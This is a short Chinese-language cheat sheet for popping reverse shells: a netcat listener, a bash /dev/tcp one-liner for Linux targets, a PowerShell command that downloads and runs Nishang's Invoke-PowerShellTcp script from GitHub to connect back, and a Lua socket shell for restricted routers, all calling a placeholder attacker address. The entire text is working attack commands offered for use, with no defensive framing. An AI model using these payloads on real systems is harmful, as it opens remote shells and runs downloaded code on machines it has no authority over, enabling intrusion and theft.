# 弹个shell
在本地监听39574端口,本机ip为`a.b.c.d`
```bash
nc -lvvvp 39574
```
* 在Linux目标上
    ```bash
    bash -i >& /dev/tcp/a.b.c.d/39574 0>&1
    ```
* 在Windows目标上
    ```powershell
    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress a.b.c.d -port 39574
    ```
* 在一些受限的Linux路由器上
    ```bash
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('a.b.c.d','39574');os.execute('/bin/sh <&3 >&3 2>&3');"
    ```